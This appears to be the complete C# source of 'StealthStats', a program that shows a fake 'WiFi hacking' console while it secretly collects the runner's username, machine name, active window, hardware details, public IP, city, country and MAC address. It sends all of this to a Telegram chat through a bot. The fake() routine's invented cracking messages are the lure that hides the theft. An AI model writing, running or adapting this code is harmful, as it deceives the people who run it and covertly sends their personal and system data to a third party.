using System;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using System.Runtime.InteropServices;

namespace SystemInfoBot
{
    class Program
    {


    

        // Replace the _botToken Variable values with your own Telegram Bot Token.
        private static string _botToken = "Your_bot_token";

        // Replace the _chatID Variable values with your own Telegram chatID.
        private static long _chatId = 5734007989;

 

        static void Main(string[] args)

        {

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("");
            Console.WriteLine(@"
.d8888. d888888b d88888b  .d8b.  db      d888888b db   db .d8888. d888888b  .d8b.  d888888b .d8888. 
88'  YP `~~88~~' 88'     d8' `8b 88      `~~88~~' 88   88 88'  YP `~~88~~' d8' `8b `~~88~~' 88'  YP 
`8bo.      88    88ooooo 88ooo88 88         88    88ooo88 `8bo.      88    88ooo88    88    `8bo.   
  `Y8b.    88    88~~~~~ 88~~~88 88         88    88~~~88   `Y8b.    88    88~~~88    88      `Y8b. 
db   8D    88    88.     88   88 88booo.    88    88   88 db   8D    88    88   88    88    db   8D 
`8888Y'    YP    Y88888P YP   YP Y88888P    YP    YP   YP `8888Y'    YP    YP   YP    YP    `8888Y' 
                                                                                                    
                                                                                                    
");

            fake();



            // Close the terminal window
            var process = new Process();
            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C exit",
                CreateNoWindow = true,
                UseShellExecute = false
            };
            process.StartInfo = startInfo;
            process.Start();


        }

        static string GetSystemInfo()
        {
            string username = Environment.UserName;
            string machineName = Environment.MachineName;
            string activeWindow = GetActiveWindow();
            string filePath = Process.GetCurrentProcess().MainModule.FileName;
            string osVersion = Environment.OSVersion.VersionString;
            string cpuName = GetCpuName();
            string gpuName = GetGpuName();
            ulong ramSize = GetRamSize();
            string country = GetCountry();
            string city = GetCity();
            string macAddress = GetMacAddress();
            string publicIp = GetPublicIp();

            string devmsg = "Welcome to 🧛‍♂️ StealthStats 🧛‍♂️ \n\nA powerful tool for gathering system information on Windows machines." +
                " This software was developed by Rahad." +
                " With StealthStates, you can easily gather critical information about a target machine, including hardware specifications, network details, and more." +
                "Give it a try today and see what insights you can uncover!\n\n" + "For more information, \nFaceook: https://facebook.com/rahad-infosec\n\n\n";


            string message = string.Format(devmsg + "Gathered Informations are: \n\n" + "Username: {0}" +
                "\n\nMachine name: {1}" +
                "\n\nActive window: {2}" +
                "\n\nFile path: {3}" +
                "\n\nOS version: {4}" +
                "\n\nCPU: {5}\n\nGPU: {6}" +
                "\n\nRAM size: {7} GB" +
                "\n\nCountry: {8}" +
                "\n\nCity: {9}" +
                "\n\nMAC address: {10}" +
                "\n\nPublic IP: {11}",

                username, machineName, activeWindow, filePath, osVersion, cpuName, gpuName, ramSize, country, city, macAddress, publicIp);

            return message;
        }


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);



        static string GetActiveWindow()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder sb = new StringBuilder(nChars);

            handle = GetForegroundWindow();

            if (GetWindowText(handle, sb, nChars) > 0)
            {
                return sb.ToString();
            }

            return "Unknown";
        }



        static string GetCpuName()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from Win32_Processor");
            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"].ToString();
            }
            return "Unknown";
        }



        static string GetGpuName()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from Win32_VideoController");
            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"].ToString();
            }
            return "Unknown";
        }



        static ulong GetRamSize()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Capacity from Win32_PhysicalMemory");
            ulong totalCapacity = 0;
            foreach (ManagementObject obj in searcher.Get())
            {
                ulong capacity = Convert.ToUInt64(obj["Capacity"]);
                totalCapacity += capacity;
            }
            return totalCapacity / (1024 * 1024 * 1024);
        }


        static string GetPublicIp()
        {
            string url = "https://api.ipify.org";
            try
            {
                using (var client = new WebClient())
                {
                    return client.DownloadString(url);
                }
            }
            catch (WebException ex)
            {
                Console.WriteLine(ex.Message);
            }
            return "Unknown";
        }




        static string GetCity()
        {
            string ip = new WebClient().DownloadString("https://api.ipify.org");
            string url = string.Format("https://ipapi.co/{0}/city/", ip);

            using (WebClient client = new WebClient())
            {
                return client.DownloadString(url);
            }
        }

        static string GetCountry()
        {
            string ip = new WebClient().DownloadString("https://api.ipify.org");
            string url = string.Format("https://ipapi.co/{0}/country/", ip);

            using (WebClient client = new WebClient())
            {
                return client.DownloadString(url);
            }
        }


        static string GetMacAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nic in nics)
            {
                if (nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                {
                    PhysicalAddress address = nic.GetPhysicalAddress();
                    byte[] bytes = address.GetAddressBytes();
                    string mac = "";
                    for (int i = 0; i < bytes.Length; i++)
                    {
                        mac += bytes[i].ToString("X2");
                        if (i != bytes.Length - 1)
                        {
                            mac += ":";
                        }
                    }
                    return mac;
                }
            }
            return "Unknown";
        }

        public static void fake()
        {
            Console.Title = "WiFi Hacking Terminal";

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(" [#] Starting Wifi Hacking Process...\n");
            Thread.Sleep(3000);

            Console.WriteLine(" [#] Initializing Wifi Modules...\n");
            Thread.Sleep(3000);

            Console.WriteLine(" [#] Accessing Target Wifi Network...\n");
            Thread.Sleep(3000);

            Console.WriteLine(" [#] Cracking Wifi Password...\n");
            Thread.Sleep(5000);

            Console.WriteLine(" [#] Password Found: p@ssw0rd123\n");
            Thread.Sleep(3000);

            Console.WriteLine(" [#] Connecting to Target Wifi Network...\n");
            Thread.Sleep(3000);


            string message = GetSystemInfo();
            SendMessageAsync(message).Wait();

            Console.WriteLine(" [#] Successfully connected to target Wifi Network!\n");
            Thread.Sleep(3000);

            Console.ResetColor();
            Console.Clear();
        }

        static async Task SendMessageAsync(string message)
        {
            TelegramBotClient botClient = new TelegramBotClient(_botToken);
            await botClient.SendTextMessageAsync(_chatId, message);
        }
    }
}
